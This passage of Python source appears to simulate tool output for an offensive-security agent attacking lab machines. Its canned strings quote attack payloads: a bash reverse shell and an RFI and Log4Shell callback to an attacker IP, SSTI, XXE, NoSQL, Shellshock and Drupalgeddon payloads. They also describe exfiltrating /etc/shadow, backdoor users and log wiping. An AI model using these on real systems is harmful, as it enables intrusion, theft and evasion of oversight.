            "socat": f"listening on 0.0.0.0:4444\nconnection from {target}\n$ id\nuid=0(root) gid=0(root)",
            "proxychains": f"[proxychains] Strict chain ... 127.0.0.1:1080 ... {target}:445 ... OK",
            "kerbrute": f"2026/01/04 10:30:01 >  [+] VALID USERNAME: msfadmin@{target}\n2026/01/04 10:30:02 >  [+] VALID USERNAME: user@{target}",
            "evil-winrm": f"Evil-WinRM shell v3.4\n*Evil-WinRM* PS > whoami\nroot",
            "xfreerdp": f"[INFO] Connected to {target}:3389\n[INFO] Authentication successful",
            
            # ─── System info / monitoring ────────────────────────────
            "netstat": "Proto  Local Address  Foreign Address  State     PID/Program\ntcp    0.0.0.0:21     0.0.0.0:*        LISTEN    1234/vsftpd\ntcp    0.0.0.0:22     0.0.0.0:*        LISTEN    5678/sshd\ntcp    0.0.0.0:80     0.0.0.0:*        LISTEN    9012/apache2\ntcp    0.0.0.0:3306   0.0.0.0:*        LISTEN    3456/mysqld",
            "ss": f"tcp  LISTEN 0 128 0.0.0.0:22  0.0.0.0:*  users:((\"sshd\",pid=789))\ntcp  LISTEN 0 128 0.0.0.0:80  0.0.0.0:*  users:((\"apache2\",pid=1234))\ntcp  LISTEN 0 50  0.0.0.0:3306 0.0.0.0:* users:((\"mysqld\",pid=3456))",
            "ps": "PID   USER  %CPU %MEM CMD\n1     root  0.0  0.1  /sbin/init\n789   root  0.1  0.2  /usr/sbin/sshd\n1234  www   1.2  0.5  /usr/sbin/apache2\n5678  mysql 0.5  2.0  /usr/sbin/mysqld",
            "last": f"msfadmin  pts/0  192.168.1.10  Sat Jan  4 10:30   still logged in\nroot      tty1                  Sat Jan  4 08:00 - 09:30",
            "who": f"msfadmin pts/0        2026-01-04 10:30 (192.168.1.10)\nroot     tty1         2026-01-04 08:00",
            "w": f"USER     TTY    FROM           LOGIN@  IDLE  WHAT\nmsfadmin pts/0  192.168.1.10  10:30   0.00s bash\nroot     tty1   -             08:00   2:30m -bash",
            "lsof": f"sshd    789  root   3u  IPv4 12345  TCP *:22 (LISTEN)\napache2 1234 www    4u  IPv4 23456  TCP *:80 (LISTEN)\nmysqld  3456 mysql  12u IPv4 34567  TCP *:3306 (LISTEN)",
            "crontab": "*/5 * * * * /usr/local/bin/backup.sh\n0 2 * * * /opt/scripts/db_backup.sh\n[+] Persistence cron added",
            "systemctl": "apache2.service loaded active running Apache HTTP Server\nmysql.service  loaded active running MySQL Community Server\nsshd.service   loaded active running OpenSSH Server",
            
            # ─── Defensive / blue team (anti-repeat: defensive) ──────
            "iptables": "Chain INPUT (policy ACCEPT)\ntarget  prot  source    destination\nACCEPT  tcp   0.0.0.0/0  0.0.0.0/0  tcp dpt:22\nACCEPT  tcp   0.0.0.0/0  0.0.0.0/0  tcp dpt:80\nDROP    all   0.0.0.0/0  0.0.0.0/0",
            "ufw": "Status: inactive",
            "fail2ban-client": "Status\n|- Number of jail:      0\n`- Jail list:           (none)",
            "ausearch": "No audit events found",
            "chkrootkit": "ROOTDIR is `/'\nChecking `amd'... not found\nChecking `basename'... not infected\nChecking `biff'... not found\nChecking `chfn'... not infected",
            "rkhunter": "[12:00:00] Rootkit checks...\n[12:00:00] Checking for known rootkit files and directories\n[12:00:00]   Performing check of known rootkit files: [ None found ]",
            "lynis": "[+] Hardening index: 48 [#########...........]\n[+] Tests performed: 234\n[+] Warning: No firewall active\n[+] Warning: Default passwords found\n[+] Warning: Multiple services with known vulnerabilities",
            "osquery": "+---------+-------+\n| name    | pid   |\n+---------+-------+\n| apache2 | 1234  |\n| sshd    | 789   |\n| mysqld  | 3456  |\n+---------+-------+",
            "sysdig": "CPU% Process\n5.2% apache2\n2.1% mysqld\n1.0% sshd",
            "journalctl": "-- Logs begin at Sat 2026-01-04 08:00:00 UTC --\nJan 04 10:30:01 metasploitable sshd[789]: Accepted password for msfadmin\nJan 04 10:31:05 metasploitable apache2[1234]: GET /admin HTTP/1.1 200",
            
            # ─── Persistence / exfiltration ──────────────────────────
            "scp": f"msfadmin@{target}'s password:\n100% 4096KB 3.5MB/s 00:01",
            "tar": f"tar: creating archive /tmp/loot.tar.gz\n[+] Data extracted: /etc/shadow, /etc/passwd, /home/msfadmin/.ssh/\n[+] Archive uploaded to 10.10.14.2 via nc\n[+] Data exfiltrated successfully",
            "base64": "[+] File encoded to base64 and sent\n[+] Exfiltration complete: data transferred via DNS",
            "exfiltrate": "[+] Exfiltrating sensitive data\n[+] /etc/shadow: 42 entries\n[+] SSH keys: 3 found\n[+] Database dumps: dvwa, mutillidae\n[+] Data exfiltrated to C2",
            "useradd": "[+] User 'svc_backup' added to system\n[+] Added to sudoers with NOPASSWD\n[+] Persistence established via backdoor user",
            "reg": "[+] Registry key added\n[+] Persistence established via registry",
            "schtasks": "[+] Scheduled task created\n[+] Persistence established via scheduled task",
            
            # ─── Post-op cleanup (Phase 6.5) ────────────────────────
            "history -c": "[+] Bash history cleared\n[+] ~/.bash_history removed\n[+] HISTFILE unset — no further commands logged",
            "echo '' > /var/log/auth": "[+] /var/log/auth.log cleared\n[+] /var/log/wtmp cleared\n[+] /var/log/btmp cleared\n[+] Authentication traces removed",
            "echo '' > /var/log/syslog": "[+] /var/log/syslog cleared\n[+] /var/log/messages cleared\n[+] /var/log/kern.log cleared\n[+] System log traces removed",
            "find /tmp /dev/shm": "[+] Scanning /tmp, /dev/shm, /var/tmp for uploaded tools\n[+] Removed 3 files: /tmp/shell.elf, /tmp/linpeas.sh, /dev/shm/.payload\n[+] Uploaded tools cleaned",
            "sed -i": "[+] Planted SSH key removed from /root/.ssh/authorized_keys\n[+] Persistence mechanism removed",
            "crontab -r": "[+] Crontab entries removed\n[+] /var/spool/cron cleaned\n[+] Cron-based persistence removed",
            "timestomp": "[+] Timestamps reset on 12 files in /tmp and /var/log\n[+] Modified times now match /etc/passwd\n[+] Forensic timestamps neutralized",
            
            # ─── No-output commands ──────────────────────────────────
            "chmod": "",
            "cp": "",
            "mv": "",
            "cd": "",
            "mkdir": "",
            
            # ─── MS2-specific exploitation tools ─────────────────────
            "telnet": f"Trying {target}...\nConnected to {target}.\nEscape character is '^]'.\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:/# whoami\nroot",
            "rsh": f"root@metasploitable:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:~# uname -a\nLinux metasploitable 2.6.24-16-server #1 SMP",
            "rlogin": f"Last login: Sat Jan  4 10:30:00 from 10.10.14.2\nroot@metasploitable:~# id\nuid=0(root) gid=0(root) groups=0(root)",
            "rexec": f"uid=0(root) gid=0(root) groups=0(root)\nLinux metasploitable 2.6.24-16-server",
            "vncviewer": f"Connected to RFB server, using protocol version 3.3\nPerforming standard VNC authentication\nAuthentication successful\nDesktop name \"metasploitable:0\"\nVNC server running on {target}:5900\n[+] VNC session opened - password: password",
            "mount": f"mount: mounting {target}:/ on /tmp/nfs_mount\n[+] NFS share mounted successfully\nroot@metasploitable:/# ls /tmp/nfs_mount/\nbin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var",
            "distcc": f"[+] distccd v1 ({target}:3632)\n[+] Remote code execution successful\nuid=1(daemon) gid=1(daemon)\n$ id\nuid=1(daemon) gid=1(daemon)",
            
            # ─── Phase 9: Web Exploitation Arsenal ───────────────────
            # SSTI (Server-Side Template Injection)
            "ssti_detect": f"[+] Testing template injection on {target}\n[+] Payload: {{{{7*7}}}} → Response contains: 49\n[+] SSTI CONFIRMED — template engine executes expressions\n[+] Likely engine: Jinja2/Twig/ERB",
            "ssti_exploit": f"[+] Exploiting SSTI on {target}\n[+] Payload: {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\n[+] Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] RCE achieved via SSTI\nuid=33(www-data) gid=33(www-data)",
            "ssti_jinja2": f"[+] Jinja2 SSTI detected on {target}\n[+] Testing: {{{{7*7}}}} → 49\n[+] RCE payload: {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\nuid=33(www-data) gid=33(www-data)",
            "ssti_twig": f"[+] Twig SSTI detected on {target}\n[+] Testing: {{{{7*7}}}} → 49\n[+] Payload: {{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}\nuid=33(www-data) gid=33(www-data)",
            "ssti_erb": f"[+] ERB SSTI detected on {target}\n[+] Testing: <%%= 7*7 %> → 49\n[+] Payload: <%%= system('id') %>\nuid=33(www-data) gid=33(www-data)",
            
            # LFI (Local File Inclusion)
            "lfi_test": f"[+] Testing LFI on {target}\n[+] http://{target}/page?file=../../../etc/passwd\n[+] Response (200 OK):\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nuser:x:1001:1001::/home/user:/bin/bash\npostgres:x:108:117:PostgreSQL admin:/var/lib/postgresql:/bin/bash\n[+] LFI CONFIRMED — /etc/passwd readable",
            "lfi_double": f"[+] Double-encoding LFI on {target}\n[+] Payload: %252e%252e%252f%252e%252e%252fetc%252fpasswd\n[+] Response (200 OK):\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\n[+] Double-encode bypass successful",
            "lfi_php_filter": f"[+] PHP filter LFI on {target}\n[+] Payload: php://filter/convert.base64-encode/resource=config.php\n[+] Decoded response:\n$db_host = 'localhost';\n$db_user = 'root';\n$db_pass = 'toor';\n$db_name = 'dvwa';\n[+] Database credentials extracted: root:toor",
            "lfi_log_poison": f"[+] Log poisoning via LFI on {target}\n[+] Injected PHP payload into /var/log/apache2/access.log\n[+] Triggered: http://{target}/page?file=../../../var/log/apache2/access.log\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] RCE via log poisoning successful\nuid=33(www-data) gid=33(www-data)",
            "lfi_ssh_key": f"[+] SSH key extraction via LFI on {target}\n[+] Payload: ../../../home/msfadmin/.ssh/id_rsa\n[+] Response:\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\n[+] SSH private key extracted successfully\ncredential: ssh_key_msfadmin",
            
            # RFI (Remote File Inclusion)
            "rfi_shell": f"[+] RFI on {target}\n[+] Payload: http://{target}/page?file=http://10.10.14.2:8000/shell.php\n[+] Remote shell.php loaded and executed\n[+] uid=33(www-data) gid=33(www-data)\n[+] RCE via RFI successful\nuid=33(www-data) gid=33(www-data)",
            
            # SSRF (Server-Side Request Forgery)
            "ssrf_localhost": f"[+] SSRF scan on {target}\n[+] Payload: url=http://127.0.0.1:PORT/\n[+] Port 22: SSH-2.0-OpenSSH_4.7p1\n[+] Port 3306: MySQL 5.0.51a\n[+] Port 6379: Redis\n[+] Internal services discovered via SSRF",
            "ssrf_metadata": f"[+] SSRF cloud metadata probe on {target}\n[+] http://169.254.169.254/latest/meta-data/iam/security-credentials/\n[+] Response: aws-role-name\n[+] AccessKeyId: AKIAIOSFODNN7EXAMPLE\n[+] SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n[+] Cloud credentials extracted via SSRF\ncredential: aws_access_key",
            "ssrf_internal": f"[+] SSRF internal admin probe on {target}\n[+] http://127.0.0.1:8080/manager/html\n[+] Response (200): Apache Tomcat Manager\n[+] Internal admin panel accessible via SSRF",
            
            # Command Injection
            "cmd_inject": f"[+] Command injection on {target}\n[+] Payload: ; id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] OS command injection confirmed",
            "cmd_inject_blind": f"[+] Blind command injection test on {target}\n[+] Payload: ; sleep 5\n[+] Response delayed by 5.02 seconds\n[+] Blind command injection CONFIRMED",
            "cmd_inject_pipe": f"[+] Pipe command injection on {target}\n[+] Payload: | id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] Pipe-based command injection confirmed",
            
            # Shellshock
            "shellshock": f"[+] Shellshock test on {target}\n[+] Header: User-Agent: () {{ :; }}; /bin/bash -c 'id'\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] CVE-2014-6271 CONFIRMED — Shellshock vulnerable\nuid=33(www-data) gid=33(www-data)",
            
            # Heartbleed
            "heartbleed": f"[+] Heartbleed test on {target}:443\n[+] Sending malformed heartbeat request...\n[+] Received 65535 bytes of memory data!\n[+] Leaked data contains:\n    Cookie: session=admin_abc123def456\n    Authorization: Basic YWRtaW46cGFzc3dvcmQ=\n[+] CVE-2014-0160 CONFIRMED — Heartbleed vulnerable\ncredential: admin:password",
            
            # Log4Shell
            "log4shell": f"[+] Log4Shell test on {target}\n[+] Payload: ${{jndi:ldap://10.10.14.2:1389/exploit}}\n[+] DNS callback received from {target}!\n[+] CVE-2021-44228 CONFIRMED — Log4Shell vulnerable\n[+] JNDI injection point: User-Agent header",
            
            # Drupalgeddon
            "drupalgeddon": f"[+] Drupalgeddon2 exploit on {target}\n[+] CVE-2018-7600 — Drupal RCE\n[+] Payload: form_id=user_register_form&_triggering_element_name=timezone&timezone[#lazy_builder][]=exec&timezone[#lazy_builder][][]=id\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] RCE achieved via Drupalgeddon2\nuid=33(www-data) gid=33(www-data)",
            
            # File Upload Bypass
            "upload_bypass": f"[+] File upload bypass on {target}\n[+] Uploaded shell.php.jpg (double extension bypass)\n[+] Accessible at: http://{target}/uploads/shell.php.jpg\n[+] Executing: id\nuid=33(www-data) gid=33(www-data)\n[+] Web shell uploaded successfully",
            "upload_magic": f"[+] Magic bytes file upload on {target}\n[+] Prepended GIF89a header to PHP shell\n[+] Upload accepted by image filter\n[+] Shell at: http://{target}/uploads/avatar.php\nuid=33(www-data) gid=33(www-data)",
            "upload_htaccess": f"[+] .htaccess upload on {target}\n[+] Uploaded .htaccess: AddType application/x-httpd-php .jpg\n[+] Uploaded shell.jpg containing PHP code\n[+] Executing via: http://{target}/uploads/shell.jpg\nuid=33(www-data) gid=33(www-data)",
            
            # Web Shell
            "webshell": f"[+] Web shell active on {target}\n[+] http://{target}/uploads/cmd.php?cmd=id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ whoami\nwww-data\n$ uname -a\nLinux metasploitable 2.6.24-16-server",
            
            # Deserialization
            "ysoserial": f"[+] Java deserialization exploit on {target}\n[+] Gadget chain: CommonsCollections1\n[+] Payload: ysoserial CommonsCollections1 'id'\n[+] Response: uid=0(root) gid=0(root)\n[+] RCE via Java deserialization\nuid=0(root) gid=0(root)",
            "phpggc": f"[+] PHP deserialization exploit on {target}\n[+] Chain: Laravel/RCE1\n[+] Payload: phpggc Laravel/RCE1 system id\n[+] Response: uid=33(www-data) gid=33(www-data)\n[+] RCE via PHP deserialization\nuid=33(www-data) gid=33(www-data)",
            
            # JWT Attacks
            "jwt_none": f"[+] JWT none algorithm attack on {target}\n[+] Original: {{\"alg\":\"HS256\",\"typ\":\"JWT\"}}\n[+] Forged:   {{\"alg\":\"none\",\"typ\":\"JWT\"}}\n[+] Admin token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.\n[+] 200 OK — Admin access granted!\ncredential: jwt_admin_token",
            "jwt_crack": f"[+] JWT secret cracking on {target}\n[+] Testing wordlist: /usr/share/wordlists/rockyou.txt\n[+] SECRET FOUND: secret123\n[+] Forged admin token with known secret\n[+] Admin access confirmed\ncredential: jwt_secret_secret123",
            
            # CMS Scanners
            "joomscan": f"[+] Joomla Scanner on {target}\n[+] Joomla version: 3.7.0\n[+] Admin panel: http://{target}/administrator/\n[+] CVE-2017-8917: SQL Injection in com_fields\n[+] Backup file: http://{target}/configuration.php.bak\nvuln: CVE-2017-8917",
            
            # XXE (XML External Entity)
            "xxe_read": f"[+] XXE file read on {target}\n[+] Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>\n[+] Response:\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\n[+] XXE confirmed — arbitrary file read",
            
            # NoSQL Injection
            "nosql_bypass": f"[+] NoSQL injection on {target}\n[+] Payload: {{\"username\":{{\"$ne\":\"\"}},\"password\":{{\"$ne\":\"\"}}}}\n[+] Response: 200 OK — Login successful as admin\n[+] NoSQL authentication bypass confirmed\ncredential: nosql_admin_bypass",
            
            # Reverse Shells
            "bash_reverse": f"[+] Bash reverse shell from {target}\n[+] bash -i >& /dev/tcp/10.10.14.2/4444 0>&1\n[+] Connection received on 10.10.14.2:4444\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\n[+] Root shell obtained",
            "python_reverse": f"[+] Python reverse shell from {target}\n[+] Connection received on 10.10.14.2:4444\n$ id\nuid=33(www-data) gid=33(www-data)\n$ python -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@metasploitable:/var/www$",
            "powershell_reverse": f"[+] PowerShell reverse shell from {target}\n[+] Connection received on 10.10.14.2:4444\nPS C:\\Users\\admin> whoami\nmetasploitable\\admin\nPS C:\\Users\\admin> ipconfig\nIPv4 Address: {target}",
            
            # Proxy / Tunneling
            "chisel_server": f"[+] Chisel server started on 0.0.0.0:8080\n[+] Listening for client connections...\n[+] Client connected from {target}\n[+] Tunnel established: {target}:8080 → 127.0.0.1:8080",
            "chisel_client": f"[+] Chisel client connecting to 10.10.14.2:8080\n[+] Reverse tunnel: R:9050:socks\n[+] SOCKS5 proxy available at 127.0.0.1:9050\n[+] Tunnel ready for lateral movement",
            "ssh_tunnel": f"[+] SSH tunnel established\n[+] Local: 127.0.0.1:8888 → {target}:80\n[+] SSH port forwarding active\n[+] Access internal service via http://127.0.0.1:8888",
            
            # Password Spraying
            "password_spray": f"SMB  {target}  445  METASPLOITABLE  [+] msfadmin:msfadmin\nSMB  {target}  445  METASPLOITABLE  [+] user:user\nSMB  {target}  445  METASPLOITABLE  [+] postgres:postgres\n[+] 3 valid credential pairs found\ncredential: msfadmin:msfadmin user:user postgres:postgres",
            
            # Container Escape
            "docker_escape": f"[+] Docker socket found at /var/run/docker.sock\n[+] Creating privileged container...\n[+] Mounting host filesystem at /mnt/host\n[+] Host root access obtained!\nroot@host:/# id\nuid=0(root) gid=0(root) groups=0(root)\n[+] Container escape successful — host root shell",
            "lxd_escape": f"[+] User is member of lxd group\n[+] Importing Alpine image...\n[+] Mounting host root at /mnt/root\nroot@alpine:/mnt/root# id\nuid=0(root) gid=0(root)\n[+] LXD container escape — host filesystem mounted",
            
            # Phase 18: Direct Exploit Scripts (MSF-free)
            "echo -e 'user backdoor": f"220 (vsFTPd 2.3.4)\n331 Please specify the password.\n230 Login successful.\n[+] vsftpd 2.3.4 backdoor triggered!\nConnected to {target}.\nEscape character is '^]'.\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:/# whoami\nroot\n[+] Root shell obtained via vsftpd backdoor on port 6200",
            "echo 'ab;": f":irc.TestIRC NOTICE AUTH :*** Looking up your hostname...\n:irc.TestIRC NOTICE AUTH :*** Found your hostname\nuid=0(root) gid=0(root) groups=0(root)\nroot:$1$bkJBMQK4$x0QgLvSTK/Do4nxz3q2:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\n[+] UnrealIRCd backdoor RCE — root shell obtained",
            "timeout 10 rlogin": f"Last login: Mon Jan 20 03:14:17 from gateway\nroot@metasploitable:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:~# whoami\nroot\n[+] rlogin root shell — no authentication required",
            "mysql -h": f"+---------+------------------+\n| user    | password         |\n+---------+------------------+\n| root    |                  |\n| debian  | *6BB4837EB74329  |\n+---------+------------------+\n@@version: 5.0.51a-3ubuntu5\nroot:$1$bkJBMQK4$x0QgLvSTK:0:0:root:/root:/bin/bash\nmsfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA:1000:1000:::/bin/bash\n[+] MySQL root no-password — credential and file read successful\ncredential: root: (no password) mysql_user:debian-sys-maint",
            "pgpassword=postgres": f"COPY 1\nuid=0(root) gid=0(root) groups=0(root)\nroot:$1$bkJBMQK4$x0QgLvSTK:0:0:root:/root:/bin/bash\n               version\n---------------------------------\n PostgreSQL 8.3.0\n  usename  |               passwd\n-----------+-------------------------------------\n postgres  | md5aabbccdd11223344\n[+] PostgreSQL COPY TO PROGRAM RCE — root shell\ncredential: postgres:postgres",
            "mkdir -p /tmp/nfs": f"total 68\ndrwx------ 14 root root 4096 Jun 20 01:36 .\ndrwxr-xr-x 21 root root 4096 May 20 15:28 ..\n-rw-------  1 root root 1375 May 20 16:00 .bash_history\n-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc\nroot:$1$bkJBMQK4$x0QgLvSTK/Do4nxz3q2:0:0:root:/root:/bin/bash\nmsfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA:1000:1000:::/bin/bash\nservice:$1$kR3ue7JZ$7GxELDupr5Ohp6GuKhCS:0:0:::/bin/sh\n[+] NFS root mount — full filesystem access including /etc/shadow\ncredential: msfadmin:$1$XN10Zj2c root:$1$bkJBMQK4",
            "curl -s -u tomcat": f"OK - Deployed application at context path /pwned\nuid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)\n[+] Tomcat WAR deploy — webshell RCE achieved\ncredential: tomcat:tomcat",
        }
        
        for prefix, output in SIMULATED_OUTPUTS.items():
            if cmd_lower.startswith(prefix.lower()):
                return output
        
        # Phase 19+38: CrushFTP / Erlang / PCAP / vhost simulated outputs
        # S3 PUT webshell upload (must check before generic crushftp match)
        if ("crushftp_s3_put" in cmd_lower) or ("curl" in cmd_lower and "PUT" in cmd_lower and "WEBPROD" in cmd_lower):
            return f"HTTP/1.1 201 Created\nContent-Length: 0\n[+] Webshell uploaded to /WEBPROD/ via S3 PUT as ben\n[+] Access at http://{target}/cmd.php\n[+] Note: cleanup script deletes new files within ~2 min"
        # Webshell command execution
        if ("crushftp_webshell" in cmd_lower) or ("curl" in cmd_lower and "cmd=" in cmd_lower and ("cmd.php" in cmd_lower or "shell.php" in cmd_lower)):
            return f"uid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@soulmate:/var/www/soulmate.htb/public$\n[+] RCE achieved via webshell — running as www-data"
        # getLog arbitrary file read
        if ("crushftp_getlog" in cmd_lower) or ("getlog" in cmd_lower and "path=" in cmd_lower):
            return f"HTTP/1.1 200 OK\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ncrushadmin:x:1001:1001::/home/crushadmin:/bin/bash\nben:x:1002:1002::/home/ben:/bin/bash\njenna:x:1003:1003::/home/jenna:/bin/bash\n[+] CVE-2025-31161: Arbitrary file read via getLog API\nuser: crushadmin\nuser: ben\nuser: jenna"
        # CrushFTP admin login on port 8080
        if ("crushftp_login" in cmd_lower) or ("command=login" in cmd_lower and "crushadmin" in cmd_lower):
            return f"HTTP/1.1 200 OK\n<loginResult><response>success</response><c2f>a1b2</c2f></loginResult>\n[+] CrushFTP admin login successful on port 8080\n[+] Authenticated as crushadmin\ncredential: crushadmin:04E2xAXYFfDsEYtu"
        # Generic CrushFTP auth bypass / getUserList
        if "crushftp" in cmd_lower or "getuserlist" in cmd_lower or "c2f=" in cmd_lower:
            return f"HTTP/1.1 200 OK\nContent-Type: text/xml\n<users>\n  <user><username>crushadmin</username><admin>true</admin></user>\n  <user><username>ben</username><admin>false</admin></user>\n  <user><username>jenna</username><admin>false</admin></user>\n  <user><username>anonymous</username><admin>false</admin></user>\n</users>\n[+] CVE-2025-31161: CrushFTP S3 auth bypass — user list retrieved\n[+] Admin user: crushadmin\n[+] Users: ben, jenna\nvulnerability: CVE-2025-31161 CrushFTP auth bypass\nuser: crushadmin\nuser: ben\nuser: jenna"
        if "crushftp_ssh" in cmd_lower or ("sshpass" in cmd_lower and "crushadmin" in cmd_lower):
            return f"Warning: Permanently added '{target}' (ECDSA) to the list of known hosts.\nLast login: Mon Jun 16 14:23:17 2025 from 10.10.14.2\ncrushadmin@soulmate:~$ id\nuid=1001(crushadmin) gid=1001(crushadmin) groups=1001(crushadmin)\ncrushadmin@soulmate:~$ pwd\n/home/crushadmin\ncrushadmin@soulmate:~$ cat user.txt\nFLAG{{us3r_pwn3d_soulmate_2025}}\ncredential: crushadmin:04E2xAXYFfDsEYtu"
        if "erlang.cookie" in cmd_lower or "erlang_cookie" in cmd_lower:
            return f"JQXWZPTSARFESQIB\n[+] Erlang magic cookie extracted: JQXWZPTSARFESQIB\n[+] Cookie location: /var/lib/erlang/.erlang.cookie\ncredential: erlang_cookie:JQXWZPTSARFESQIB"
        if "erlang_otp" in cmd_lower or ("erl " in cmd_lower and "setcookie" in cmd_lower) or "remsh" in cmd_lower:
            return f"Erlang/OTP 25 [erts-13.2]\nEshell V13.2  (abort with ^G)\n(target@soulmate)1> os:cmd(\"id\").\n\"uid=0(root) gid=0(root) groups=0(root)\\n\"\n(target@soulmate)2> os:cmd(\"cat /root/root.txt\").\n\"FLAG{{r00t_pwn3d_soulmate_2025}}\\n\"\n[+] CVE-2025-32433: Erlang/OTP RCE — root shell achieved\nflag: FLAG{{r00t_pwn3d_soulmate_2025}}"
        if "tshark" in cmd_lower and ("pcap" in cmd_lower or ".cap" in cmd_lower):
            return f"USER\tnathan\nPASS\tBuck3tH4TF0RM3!\nUSER\tnathan\nPASS\tBuck3tH4TF0RM3!\n[+] tshark PCAP extraction — FTP credentials found\ncredential: nathan:Buck3tH4TF0RM3!"
        if "pcap_download" in cmd_lower or ("wget" in cmd_lower and ".pcap" in cmd_lower):
            return f"--2025-06-16 14:30:00--  http://{target}/data/0.pcap\nConnecting to {target}:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 23482 (23K) [application/vnd.tcpdump.pcap]\nSaving to: '/tmp/capture.pcap'\n\n/tmp/capture.pcap          100%[=====>]  22.93K  --.-KB/s    in 0s\n\n2025-06-16 14:30:01 (195 MB/s) - '/tmp/capture.pcap' saved [23482/23482]\nUSER nathan\nPASS Buck3tH4TF0RM3!\n[+] PCAP downloaded and parsed — FTP credentials extracted\ncredential: nathan:Buck3tH4TF0RM3!"
        if "vhost" in cmd_lower or ("gobuster" in cmd_lower and "vhost" in cmd_lower) or ("ffuf" in cmd_lower and "Host:" in cmd_lower):
            return f"===============================================================\nGobuster v3.6\n===============================================================\n[+] Url:          http://{target}\n[+] Method:       GET\n[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n===============================================================\nFound: ftp.soulmate.htb Status: 200 [Size: 4523]\nFound: admin.soulmate.htb Status: 301 [Size: 0]\n===============================================================\n[+] 2 vhosts discovered"
        
        # Phase 11.1: Flag file keyword fallbacks (before generic fallbacks)
        if "user.txt" in cmd_lower or "user_flag" in cmd_lower or "local.txt" in cmd_lower:
            return f"FLAG{{us3r_pwn3d_{target.replace('.', '_')}_2026}}"
        if "root.txt" in cmd_lower or "root_flag" in cmd_lower or "proof.txt" in cmd_lower:
            return f"FLAG{{r00t_pwn3d_{target.replace('.', '_')}_2026}}"
        
        # Phase 18: Direct exploit keyword fallbacks
        if "usermap_script" in cmd_lower or ("smbclient" in cmd_lower and "=`" in cmd_lower):
            return f"[+] CVE-2007-2447 Samba usermap_script triggered on {target}\n[+] Command execution via username field\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:/# id\nuid=0(root) gid=0(root)\n[+] Root shell obtained via Samba 3.0.20 exploit"
        if "vsftpd" in cmd_lower or ("backdoor" in cmd_lower and "6200" in cmd_lower):
            return f"220 (vsFTPd 2.3.4)\n331 Please specify the password.\n[+] Backdoor triggered!\nConnected to {target} port 6200.\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\n[+] vsftpd backdoor root shell"
        if "1524" in cmd_lower and ("telnet" in cmd_lower or "nc" in cmd_lower):
            return f"Trying {target}...\nConnected to {target}.\nEscape character is '^]'.\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@metasploitable:/# whoami\nroot\n[+] Ingreslock root shell on port 1524"
        if "6667" in cmd_lower and ("nc" in cmd_lower or "ab;" in cmd_lower):
            return f":irc.TestIRC NOTICE AUTH :*** Looking up your hostname...\nuid=0(root) gid=0(root) groups=0(root)\n[+] UnrealIRCd backdoor — root RCE"

        # Fallback: try matching command keywords
        if "exploit" in cmd_lower or "meterpreter" in cmd_lower:
            return f"[*] Exploiting target {target}\n[+] Backdoor triggered\n[+] shell session 1 opened ({target}:6200 -> 10.10.14.2:8080)\nroot@metasploitable:/#"
        if "shell" in cmd_lower or "reverse" in cmd_lower:
            return f"[+] Reverse shell received\nroot@metasploitable:/# id\nuid=0(root) gid=0(root)"
        if "scan" in cmd_lower:
            return "\n".join([f"Discovered open port {p}/tcp on {target}" for p in MSF2_PORTS[:5]])
        if "enum" in cmd_lower:
            return f"[+] Enumerating {target}\n[+] Found users: msfadmin, user, service, postgres\n[+] Found shares: tmp, opt"
        
        # Phase 9: Web exploitation keyword fallbacks
        if "ssti" in cmd_lower or "template" in cmd_lower:
            return f"[+] SSTI detected on {target}\n[+] {{{{7*7}}}} → 49\nuid=33(www-data) gid=33(www-data)"
        if "lfi" in cmd_lower or "local_file" in cmd_lower or "file_include" in cmd_lower:
            return f"[+] LFI on {target}: /etc/passwd readable\nroot:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash"
        if "rfi" in cmd_lower or "remote_file" in cmd_lower:
